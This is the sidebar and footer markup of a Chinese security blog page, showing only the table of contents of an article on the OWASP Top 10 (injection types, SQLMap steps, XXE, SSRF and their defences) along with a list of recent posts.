href="https://gitee.com/fanhao0416"><i class="fab fa-gitee"></i><span>联系我</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://gitee.com/fanhao0416" target="_blank" title="Gitee"><i class="fab fa-git" style="color: #DC143C;"></i></a><a class="social-icon" href="mailto:2039216364@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=2039216364&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">沧海易幻莫同，世人皆平庸</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#OWASP-TOP-10"><span class="toc-number">1.</span> <span class="toc-text">OWASP TOP 10</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%B4%A9%E6%BA%83-Broken-Access-Control"><span class="toc-number">1.1.</span> <span class="toc-text">01 访问控制崩溃 - Broken Access Control</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83"><span class="toc-number">1.1.2.</span> <span class="toc-text">越权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B9%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text">弱点描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="toc-number">1.1.4.</span> <span class="toc-text">防护措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS"><span class="toc-number">1.1.5.</span> <span class="toc-text">CORS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT"><span class="toc-number">1.1.6.</span> <span class="toc-text">JWT</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-%E5%8A%A0%E5%AF%86%E5%A4%B1%E6%95%88-Cryptographic-Failures"><span class="toc-number">1.2.</span> <span class="toc-text">02 加密失效 -  Cryptographic Failures</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B9%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">弱点描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">防护措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%AD%A2%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.3.</span> <span class="toc-text">防止敏感信息泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB-Injection"><span class="toc-number">1.3.</span> <span class="toc-text">03 注入攻击 - Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B-MySQL"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">SQL注入的类型(MySQL)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.1.1.</span> <span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.1.2.</span> <span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.1.1.3.</span> <span class="toc-text">判断注入类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88-Union-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.1.4.</span> <span class="toc-text">联合(Union)注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.1.1.5.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AF%BC%E8%87%B4%E7%9B%B2%E6%B3%A8%E7%9A%84%E5%B8%B8%E8%A7%81%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.3.1.1.5.1.</span> <span class="toc-text">导致盲注的常见原因</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.1.1.5.2.</span> <span class="toc-text">布尔注入(布尔盲注)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.1.1.5.3.</span> <span class="toc-text">延时注入(时间盲注)</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.1.6.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.1.6.1.</span> <span class="toc-text">floor报错注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9B%BA%E5%AE%9A%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.1.6.2.</span> <span class="toc-text">固定报错注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.1.6.3.</span> <span class="toc-text">extractvalue报错注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.1.6.4.</span> <span class="toc-text">updatexml报错注入</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POST%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.1.7.</span> <span class="toc-text">POST注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.1.8.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">1.3.1.1.8.1.</span> <span class="toc-text">原理分析</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.1.9.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.1.1.9.1.</span> <span class="toc-text">堆叠原理</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNSlog%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.1.10.</span> <span class="toc-text">DNSlog注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E5%8F%8A%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.3.1.1.10.1.</span> <span class="toc-text">基本原理及步骤</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">SQL注入防护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLMap%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">SQLMap的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLMap%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.3.1.3.1.</span> <span class="toc-text">SQLMap介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLMap%E4%BD%BF%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.3.1.3.2.</span> <span class="toc-text">SQLMap使用步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E6%A3%80%E6%B5%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.3.1.3.2.1.</span> <span class="toc-text">1. 检测注入点</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.1.3.2.2.</span> <span class="toc-text">2. 获取数据库版本</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7"><span class="toc-number">1.3.1.3.2.3.</span> <span class="toc-text">3. 获取当前用户</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.3.1.3.2.4.</span> <span class="toc-text">4. 获取数据库</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5-%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8"><span class="toc-number">1.3.1.3.2.5.</span> <span class="toc-text">5. 获取指定数据库中的表</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#6-%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%88%97"><span class="toc-number">1.3.1.3.2.6.</span> <span class="toc-text">6. 获取指定表中的列</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#7-%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E8%A1%A8%E4%B8%AD%E6%95%B0%E6%8D%AE"><span class="toc-number">1.3.1.3.2.7.</span> <span class="toc-text">7. 获取指定表中数据</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-NoSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 NoSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NoSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%86%E7%B1%BB"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">NoSQL数据库分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-Mongodb"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">利用条件 - Mongodb</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B0%B8%E7%9C%9F%E5%BC%8F%E6%B3%A8%E5%85%A5-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.2.3.1.</span> <span class="toc-text">永真式注入(万能密码)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD-2"><span class="toc-number">1.3.2.5.</span> <span class="toc-text">防护措施</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.3 命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">命令注入原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">漏洞分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-1"><span class="toc-number">1.3.3.4.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD-3"><span class="toc-number">1.3.3.5.</span> <span class="toc-text">防护措施</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E8%AE%BE%E8%AE%A1-Insecure-Design"><span class="toc-number">1.4.</span> <span class="toc-text">04 不安全的设计 - Insecure Design</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.4.1.</span> <span class="toc-text">产生原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD-4"><span class="toc-number">1.4.3.</span> <span class="toc-text">防护措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-Security-Misconfiguration"><span class="toc-number">1.5.</span> <span class="toc-text">05 安全配置错误 - Security Misconfiguration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0-1"><span class="toc-number">1.5.1.</span> <span class="toc-text">产生原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">1.5.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD-5"><span class="toc-number">1.5.3.</span> <span class="toc-text">防护措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE-XML-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.4.</span> <span class="toc-text">XXE(XML 外部实体注入攻击)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XXE%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">XXE危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XXE%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">XXE利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XXE%E9%98%B2%E5%BE%A1"><span class="toc-number">1.5.4.3.</span> <span class="toc-text">XXE防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-%E4%BD%BF%E7%94%A8%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E5%92%8C%E8%BF%87%E6%97%B6%E7%9A%84%E7%BB%84%E4%BB%B6-Vulnerable-and-Outdated-Components"><span class="toc-number">1.6.</span> <span class="toc-text">06 使用易受攻击和过时的组件 - Vulnerable and Outdated Components</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B9%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">1.6.1.</span> <span class="toc-text">弱点描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD-6"><span class="toc-number">1.6.2.</span> <span class="toc-text">防护措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-%E8%AF%86%E5%88%AB%E5%92%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E5%A4%B1%E8%B4%A5-Identification-and-Authentication-Failures"><span class="toc-number">1.7.</span> <span class="toc-text">07 识别和身份验证失败 - Identification and Authentication Failures</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B9%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">1.7.1.</span> <span class="toc-text">弱点描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD-7"><span class="toc-number">1.7.2.</span> <span class="toc-text">防护措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-%E8%BD%AF%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7%E6%95%85%E9%9A%9C-Software-and-Data-Integrity-Failures"><span class="toc-number">1.8.</span> <span class="toc-text">08 软件和数据完整性故障 - Software and Data Integrity Failures</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD-8"><span class="toc-number">1.8.1.</span> <span class="toc-text">防护措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#09-%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%92%8C%E7%9B%91%E6%8E%A7%E6%95%85%E9%9A%9C-Security-Logging-and-Monitoring-Failures"><span class="toc-number">1.9.</span> <span class="toc-text">09 安全日志记录和监控故障 - Security Logging and Monitoring Failures</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD-9"><span class="toc-number">1.9.1.</span> <span class="toc-text">防护措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-Server-Side-Request-Forgery-SSRF"><span class="toc-number">1.10.</span> <span class="toc-text">10 服务器请求伪造 - Server Side Request Forgery(SSRF)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E5%B8%B8%E8%A7%81%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.10.1.</span> <span class="toc-text">SSRF常见危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD-10"><span class="toc-number">1.10.2.</span> <span class="toc-text">防护措施</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/12/Nmap%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" title="Nmap使用指南"><img src="/img/cover/cover_2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nmap使用指南"/></a><div class="content"><a class="title" href="/2024/03/12/Nmap%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" title="Nmap使用指南">Nmap使用指南</a><time datetime="2024-03-12T02:38:29.000Z" title="发表于 2024-03-12 10:38:29">2024-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/TCP%E5%8D%8F%E8%AE%AE/" title="TCP协议"><img src="/img/cover/cover_9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TCP协议"/></a><div class="content"><a class="title" href="/2024/03/10/TCP%E5%8D%8F%E8%AE%AE/" title="TCP协议">TCP协议</a><time datetime="2024-03-10T08:15:52.000Z" title="发表于 2024-03-10 16:15:52">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/06/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/" title="常用网络安全设备"><img src="/img/cover/cover_6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="常用网络安全设备"/></a><div class="content"><a class="title" href="/2024/03/06/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/" title="常用网络安全设备">常用网络安全设备</a><time datetime="2024-03-06T00:58:05.000Z" title="发表于 2024-03-06 08:58:05">2024-03-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="渗透测试"><img src="/img/cover/cover_9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试"/></a><div class="content"><a class="title" href="/2024/03/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="渗透测试">渗透测试</a><time datetime="2024-03-06T00:57:01.000Z" title="发表于 2024-03-06 08:57:01">2024-03-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/06/OWASP-TOP-10/" title="OWASP-TOP-10"><img src="/img/cover/cover_2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="OWASP-TOP-10"/></a><div class="content"><a class="title" href="/2024/03/06/OWASP-TOP-10/" title="OWASP-TOP-10">OWASP-TOP-10</a><time datetime="2024-03-06T00:55:41.000Z" title="发表于 2024-03-06 08:55:41">2024-03-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By fanhao</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
